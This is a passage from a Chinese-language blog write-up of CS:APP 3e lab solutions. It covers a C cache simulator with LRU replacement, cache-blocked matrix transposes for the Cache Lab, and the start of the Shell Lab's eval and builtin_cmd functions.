<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span>     set_bit = <span class="hljs-number">0</span>, offset_bit = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span>     set_cnt = <span class="hljs-number">0</span>, line_cnt = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span>     hit     = <span class="hljs-number">0</span>, miss     = <span class="hljs-number">0</span>, eviction   = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span>     global_time = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cache_line</span>&#123;</span><br>    <span class="hljs-type">int</span> valid;<br>    <span class="hljs-type">int</span> tag;<br>    <span class="hljs-type">int</span> last_used_time;         <br>&#125;line;<br></code></pre></td></tr></table></figure>

<p>分配和回收缓存：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">line** <span class="hljs-title function_">alloc_cache</span><span class="hljs-params">()</span>&#123;<br>    set_cnt  = <span class="hljs-number">1</span> &lt;&lt; set_bit;<br>    line** cache = (line**)<span class="hljs-built_in">calloc</span>(set_cnt,<span class="hljs-keyword">sizeof</span>(line*));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;set_cnt;i++)<br>        cache[i]=(line*)<span class="hljs-built_in">calloc</span>(line_cnt,<span class="hljs-keyword">sizeof</span>(line));<br>    <span class="hljs-keyword">return</span> cache;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">free_cache</span><span class="hljs-params">(line** cache)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;set_cnt;i++)<span class="hljs-built_in">free</span>(cache[i]);<br>    <span class="hljs-built_in">free</span>(cache);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解析命令行参数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">info</span><span class="hljs-params">()</span> &#123;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage: ./csim [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Options:\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  -h         Print this help message.\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  -v         Optional verbose flag.\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  -s &lt;num&gt;   Number of set index bits.\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  -E &lt;num&gt;   Number of lines per set.\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  -b &lt;num&gt;   Number of block offset bits.\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  -t &lt;file&gt;  Trace file.\n\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Examples:\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  linux&gt;  ./csim -s 4 -E 1 -b 4 -t traces/yi.trace\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  linux&gt;  ./csim -v -s 8 -E 2 -b 4 -t traces/yi.trace\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span><br>&#123;<br>    <span class="hljs-type">bool</span> verbose = <span class="hljs-literal">false</span>, hint     = <span class="hljs-literal">false</span>;<br>    <span class="hljs-type">int</span>  opt     = <span class="hljs-number">-1</span>   ;<br>    FILE *file   = <span class="hljs-literal">NULL</span> ;<br>    <span class="hljs-keyword">while</span> ( (opt = getopt(argc, argv, <span class="hljs-string">&quot;hvs:E:b:t:&quot;</span>)) != <span class="hljs-number">-1</span> ) &#123;<br>        <span class="hljs-keyword">switch</span>(opt) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;h&#x27;</span>: hint       = <span class="hljs-literal">true</span>;               <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;v&#x27;</span>: verbose    = <span class="hljs-literal">true</span>;               <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>: set_bit    = atoi(optarg);       <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;E&#x27;</span>: line_cnt   = atoi(optarg);       <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span>: offset_bit = atoi(optarg);       <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;t&#x27;</span>: file       = fopen(optarg, <span class="hljs-string">&quot;r&quot;</span>); <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span> : info();                          <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (set_bit &lt;= <span class="hljs-number">0</span> || line_cnt &lt;= <span class="hljs-number">0</span> || offset_bit &lt;= <span class="hljs-number">0</span> || hint == <span class="hljs-literal">true</span> || file == <span class="hljs-literal">NULL</span> ) &#123;<br>        info();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    line** cache = alloc_cache();<br>    simulate(file, verbose, cache);<br>    printSummary(hit, miss, eviction);<br>    free_cache(cache);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>缓存操作，先查找，若未命中优先查找空行，最后使用LRU算法进行替换：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">cache_operation</span><span class="hljs-params">(<span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> mem_address, <span class="hljs-type">bool</span> verbose, line** cache)</span>&#123;<br>    <span class="hljs-type">int</span> set_index = ( mem_address &gt;&gt; offset_bit ) % set_cnt;<br>    <span class="hljs-type">int</span> line_tag  = mem_address &gt;&gt; ( offset_bit + set_bit );<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;line_cnt;i++)&#123;<br>        <span class="hljs-keyword">if</span>( cache[set_index][i].tag == line_tag &amp;&amp; cache[set_index][i].valid == <span class="hljs-number">1</span> )&#123;<br>            <span class="hljs-comment">// cache hit</span><br>            cache[set_index][i].last_used_time = global_time++;<br>            hit += <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(verbose)<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; hit&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    miss += <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span>(verbose)<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; miss&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;line_cnt;i++)&#123;<br>        <span class="hljs-keyword">if</span>( cache[set_index][i].valid == <span class="hljs-number">0</span> )&#123;       <span class="hljs-comment">// select unused line</span><br>            cache[set_index][i].valid          = <span class="hljs-number">1</span>;<br>            cache[set_index][i].tag            = line_tag;<br>            cache[set_index][i].last_used_time = global_time++;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    eviction += <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span>(verbose)<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; eviction&quot;</span>);<br>    <span class="hljs-type">int</span> lru_line = <span class="hljs-number">-1</span>, lru_min = INT_MAX;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;line_cnt;i++)&#123;<br>        <span class="hljs-keyword">if</span>( cache[set_index][i].last_used_time &lt; lru_min )&#123;       <span class="hljs-comment">// select LRU line</span><br>            lru_line = i;<br>            lru_min  = cache[set_index][i].last_used_time;<br>        &#125;<br>    &#125;<br>    cache[set_index][lru_line].valid          = <span class="hljs-number">1</span>;               <span class="hljs-comment">// update LRU line</span><br>    cache[set_index][lru_line].tag            = line_tag;<br>    cache[set_index][lru_line].last_used_time = global_time++;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解析输入文件并执行相应操作，Load&#x2F;Store各1次，Modify执行2次：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">simulate</span><span class="hljs-params">(FILE* file, <span class="hljs-type">bool</span> verbose, line** cache)</span>&#123;<br>    <span class="hljs-type">char</span>          operation;<br>    <span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> mem_address;<br>    <span class="hljs-type">int</span>           size;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(file,<span class="hljs-string">&quot; %c %lx,%d&quot;</span>,&amp;operation,&amp;mem_address,&amp;size)!=EOF)&#123;<br>        <span class="hljs-keyword">if</span>(verbose)<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c %lx,%d&quot;</span>, operation, mem_address, size);<br>        <span class="hljs-keyword">switch</span>(operation)&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;M&#x27;</span>:cache_operation(mem_address, verbose, cache);<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;L&#x27;</span>:<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;S&#x27;</span>:cache_operation(mem_address, verbose, cache);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(verbose)<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>    fclose(file);<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="Part-B-1"><a href="#Part-B-1" class="headerlink" title="Part B"></a>Part B</h3><p>优化矩阵转置，增加缓存命中率。</p>
<p>根据实验文档的说明，缓存为32组的直接映射缓存，每行数据块大小为32个字节（8个整数），总大小为256个整数。对于大小为32×32, 64×64, 61×67矩阵，最大未命中次数分别为300, 1300, 2000。</p>
<h4 id="32×32"><a href="#32×32" class="headerlink" title="32×32"></a>32×32</h4><p>缓存的容量为8行，对A矩阵以8行为步长遍历，将每一行装入缓存后写入B矩阵的相应位置。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> i, j, tmp;<br><span class="hljs-keyword">if</span>(M==<span class="hljs-number">32</span>&amp;&amp;N==<span class="hljs-number">32</span>)&#123;<br>    <span class="hljs-type">int</span> var0,var1,var2,var3,var4,var5,var6,var7;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;N;i+=<span class="hljs-number">8</span>)&#123;<br>        <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;M;j+=<span class="hljs-number">8</span>)&#123;<br>            <span class="hljs-keyword">for</span>(tmp=i;tmp&lt;i+<span class="hljs-number">8</span>;tmp+=<span class="hljs-number">1</span>)&#123;<br>                var0=A[tmp][j]  ;var1=A[tmp][j+<span class="hljs-number">1</span>];var2=A[tmp][j+<span class="hljs-number">2</span>];var3=A[tmp][j+<span class="hljs-number">3</span>];<br>                var4=A[tmp][j+<span class="hljs-number">4</span>];var5=A[tmp][j+<span class="hljs-number">5</span>];var6=A[tmp][j+<span class="hljs-number">6</span>];var7=A[tmp][j+<span class="hljs-number">7</span>];<br>                B[j][tmp]  =var0;B[j+<span class="hljs-number">1</span>][tmp]=var1;B[j+<span class="hljs-number">2</span>][tmp]=var2;B[j+<span class="hljs-number">3</span>][tmp]=var3;<br>                B[j+<span class="hljs-number">4</span>][tmp]=var4;B[j+<span class="hljs-number">5</span>][tmp]=var5;B[j+<span class="hljs-number">6</span>][tmp]=var6;B[j+<span class="hljs-number">7</span>][tmp]=var7;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>用参数<code>-M 32 -N 32</code>测试该函数：</p>
<p><img src="/CSAPP3e_WP/image-20240202145227226-172450357943937.png" style="zoom:67%;" align="left"></p>



<h4 id="64×64"><a href="#64×64" class="headerlink" title="64×64"></a>64×64</h4><p>缓存的容量为4行，只能对A矩阵每个8×8的块分为4×4的块进行操作，可以一次缓存8×4的数据。</p>
<p>第一次缓存A矩阵前4行：</p>
<p>1a. A矩阵左上角块16个→转置后填入B矩阵左上角。</p>
<p>1b. A矩阵右上角块16个→转置后填入B矩阵右上角。</p>
<p>第二次缓存A矩阵后4行：</p>
<p>2a. B矩阵右上角块16个→搬移至B矩阵左下角</p>
<p>2b. A矩阵左下角块16个→转置后填入B矩阵右上角。</p>
<p>3.A矩阵右下角块16个→转置后填入B矩阵右下角。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(M==<span class="hljs-number">64</span>&amp;&amp;N==<span class="hljs-number">64</span>)&#123;<br>    	<span class="hljs-type">int</span> var0,var1,var2,var3,var4,var5,var6,var7;<br>	    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;N;i+=<span class="hljs-number">8</span>)&#123;<br>            <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;M;j+=<span class="hljs-number">8</span>)&#123;<br>                <span class="hljs-keyword">for</span>(tmp=i;tmp&lt;i+<span class="hljs-number">4</span>;tmp+=<span class="hljs-number">1</span>)&#123;<br>                    <span class="hljs-comment">//step1a+1b</span><br>                    var0=A[tmp][j]  ;var1=A[tmp][j+<span class="hljs-number">1</span>];var2=A[tmp][j+<span class="hljs-number">2</span>];var3=A[tmp][j+<span class="hljs-number">3</span>];<br>                    var4=A[tmp][j+<span class="hljs-number">4</span>];var5=A[tmp][j+<span class="hljs-number">5</span>];var6=A[tmp][j+<span class="hljs-number">6</span>];var7=A[tmp][j+<span class="hljs-number">7</span>];<br>                    B[j][tmp]  =var0;B[j+<span class="hljs-number">1</span>][tmp]  =var1;B[j+<span class="hljs-number">2</span>][tmp]  =var2;B[j+<span class="hljs-number">3</span>][tmp]  =var3;<br>                    B[j][tmp+<span class="hljs-number">4</span>]=var4;B[j+<span class="hljs-number">1</span>][tmp+<span class="hljs-number">4</span>]=var5;B[j+<span class="hljs-number">2</span>][tmp+<span class="hljs-number">4</span>]=var6;B[j+<span class="hljs-number">3</span>][tmp+<span class="hljs-number">4</span>]=var7;<br>                &#125;<br>                <span class="hljs-keyword">for</span>(tmp=j;tmp&lt;j+<span class="hljs-number">4</span>;tmp+=<span class="hljs-number">1</span>)&#123;<br>                    <span class="hljs-comment">//step2a+2b</span><br>                    var0=A[i+<span class="hljs-number">4</span>][tmp];var1=A[i+<span class="hljs-number">5</span>][tmp];var2=A[i+<span class="hljs-number">6</span>][tmp];var3=A[i+<span class="hljs-number">7</span>][tmp];<br>                    var4=B[tmp][i+<span class="hljs-number">4</span>];var5=B[tmp][i+<span class="hljs-number">5</span>];var6=B[tmp][i+<span class="hljs-number">6</span>];var7=B[tmp][i+<span class="hljs-number">7</span>];<br>                    B[tmp][i+<span class="hljs-number">4</span>]=var0;B[tmp][i+<span class="hljs-number">5</span>]=var1;B[tmp][i+<span class="hljs-number">6</span>]=var2;B[tmp][i+<span class="hljs-number">7</span>]=var3;<br>                    B[tmp+<span class="hljs-number">4</span>][i]=var4;B[tmp+<span class="hljs-number">4</span>][i+<span class="hljs-number">1</span>]=var5;B[tmp+<span class="hljs-number">4</span>][i+<span class="hljs-number">2</span>]=var6;B[tmp+<span class="hljs-number">4</span>][i+<span class="hljs-number">3</span>]=var7;<br>                &#125;<br>                <span class="hljs-keyword">for</span>(tmp=i+<span class="hljs-number">4</span>;tmp&lt;i+<span class="hljs-number">8</span>;tmp+=<span class="hljs-number">1</span>)&#123;<br>               	    <span class="hljs-comment">//step3</span><br>                    var4=A[tmp][j+<span class="hljs-number">4</span>];var5=A[tmp][j+<span class="hljs-number">5</span>];var6=A[tmp][j+<span class="hljs-number">6</span>];var7=A[tmp][j+<span class="hljs-number">7</span>];<br>                    B[j+<span class="hljs-number">4</span>][tmp]=var4;B[j+<span class="hljs-number">5</span>][tmp]=var5;B[j+<span class="hljs-number">6</span>][tmp]=var6;B[j+<span class="hljs-number">7</span>][tmp]=var7;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>用参数<code>-M 64 -N 64</code>测试该函数：</p>
<p><img src="/CSAPP3e_WP/image-20240202164732726-172450358245639.png" style="zoom:67%;" align="left"></p>



<h4 id="61-times-67"><a href="#61-times-67" class="headerlink" title="61$\times$67"></a>61$\times$67</h4><p>M和N对于缓存容量而言难以对齐，设块大小为$b\times b$，算法如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(M==<span class="hljs-number">61</span>&amp;&amp;N==<span class="hljs-number">67</span>)&#123;<br>    <span class="hljs-type">int</span> chunk_i, chunk_j;<br>	<span class="hljs-type">int</span> b = BLOCK_SIZE;		<span class="hljs-comment">//TBD</span><br>	<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N; i += b) &#123;<br>    	<span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; M; j += b) &#123;<br>        	<span class="hljs-keyword">for</span> (chunk_i = i; chunk_i &lt; N &amp;&amp; chunk_i &lt; i + b; chunk_i+=<span class="hljs-number">1</span>) &#123;<br>            	<span class="hljs-keyword">for</span> (chunk_j = j; chunk_j &lt; M &amp;&amp; chunk_j &lt; j + b; chunk_j+=<span class="hljs-number">1</span>) &#123;<br>                	tmp = A[chunk_i][chunk_j];<br>                	B[chunk_j][chunk_i] = tmp;<br>            	&#125;<br>        	&#125;<br>    	&#125;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>不妨令b适当大些，取b&#x3D;16，用参数<code>-M 61 -N 67</code>测试该函数：</p>
<p><img src="/CSAPP3e_WP/image-20240202170120119-172450358557541.png" style="zoom:67%;" align="left"></p>



<p><strong>*为了在现代的环境上运行评测脚本，你可能需要安装2to3用于转换脚本为符合Python3语法规则的版本。</strong></p>
<h2 id="5b-Performance-Lab-Omitted"><a href="#5b-Performance-Lab-Omitted" class="headerlink" title="5b. Performance Lab(Omitted)"></a>5b. Performance Lab(Omitted)</h2><p>这个实验年代久远、太无聊、编码过程繁琐，并且评测脚本没有定量的评分目标，懒得做。</p>
<h2 id="6-Shell-Lab-信号游戏"><a href="#6-Shell-Lab-信号游戏" class="headerlink" title="6. Shell Lab: 信号游戏"></a>6. Shell Lab: 信号游戏</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>大部分代码来自CS:APP 3e Figure 8.24，父进程在<code>fork</code>子进程之前，必须先用<code>sigprocmask</code>阻塞SIGCHLD信号，在调用<code>addjob</code>将子进程加入作业列表后取消该阻塞，子进程取消阻塞SIGCHLD信号。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * eval - Evaluate the command line that the user has just typed in</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span><br><span class="hljs-comment"> * then execute it immediately. Otherwise, fork a child process and</span><br><span class="hljs-comment"> * run the job in the context of the child. If the job is running in</span><br><span class="hljs-comment"> * the foreground, wait for it to terminate and then return.  Note:</span><br><span class="hljs-comment"> * each child process must have a unique process group ID so that our</span><br><span class="hljs-comment"> * background children don&#x27;t receive SIGINT (SIGTSTP) from the kernel</span><br><span class="hljs-comment"> * when we type ctrl-c (ctrl-z) at the keyboard.  </span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">eval</span><span class="hljs-params">(<span class="hljs-type">char</span> *cmdline)</span> <br>&#123;<br>    <span class="hljs-type">char</span> *argv[MAXARGS]; <span class="hljs-comment">/* Argument list execve() */</span><br>    <span class="hljs-type">char</span> buf[MAXLINE];   <span class="hljs-comment">/* Holds modified command line */</span><br>    <span class="hljs-type">int</span> bg;              <span class="hljs-comment">/* Should the job run in bg or fg? */</span><br>    <span class="hljs-type">pid_t</span> pid;           <span class="hljs-comment">/* Process id */</span><br>    <br>    <span class="hljs-built_in">strcpy</span>(buf, cmdline);<br>    bg = parseline(buf, argv); <br>    <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">0</span>] == <span class="hljs-literal">NULL</span>)  <br>	<span class="hljs-keyword">return</span>;   <span class="hljs-comment">/* Ignore empty lines */</span><br><br>    <span class="hljs-type">sigset_t</span> mask,prev,mask_all;<br>    sigfillset(&amp;mask_all);<br>    sigemptyset(&amp;mask);<br>    sigaddset(&amp;mask,SIGCHLD);<br>    <span class="hljs-keyword">if</span> (!builtin_cmd(argv)) &#123; <br>    sigprocmask(SIG_BLOCK,&amp;mask,&amp;prev);<br>	<span class="hljs-keyword">if</span> ((pid = fork()) == <span class="hljs-number">0</span>) &#123;   <span class="hljs-comment">/* Child runs user job */</span><br>        sigprocmask(SIG_SETMASK,&amp;prev,<span class="hljs-literal">NULL</span>);    <span class="hljs-comment">//unblock child</span><br>        setpgid(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>	    <span class="hljs-keyword">if</span> (execve(argv[<span class="hljs-number">0</span>], argv, environ) &lt; <span class="hljs-number">0</span>) &#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: Command not found.\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>		<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>	    &#125;<br>	&#125;<br>    sigprocmask(SIG_BLOCK,&amp;mask_all,<span class="hljs-literal">NULL</span>);<br>    addjob(jobs,pid,bg?BG:FG,cmdline);<br>    sigprocmask(SIG_SETMASK,&amp;prev,<span class="hljs-literal">NULL</span>);<br>	<span class="hljs-comment">/* Parent waits for foreground job to terminate */</span><br>	<span class="hljs-keyword">if</span> (!bg) waitfg(pid);<br>	<span class="hljs-keyword">else</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>,pid2jid(pid), pid, cmdline);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="builtin-cmd"><a href="#builtin-cmd" class="headerlink" title="builtin_cmd"></a>builtin_cmd</h3><p>只需识别<code>quit</code>, <code>fg</code>, <code>bg</code>, <code>jobs</code>命令，根据字符串比较结果调用相应函数即可。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * builtin_cmd - If the user has typed a built-in command then execute</span><br><span class="hljs-comment"> *    it immediately.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">builtin_cmd</span><span class="hljs-params">(<span class="hljs-type">char</span> **argv)</span> <br>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;quit&quot;</span>)==<span class="hljs-number">0</span>)<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;fg&quot;</span>)==<span class="hljs-number">0</span>||<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;bg&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>        do_bgfg(argv);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span 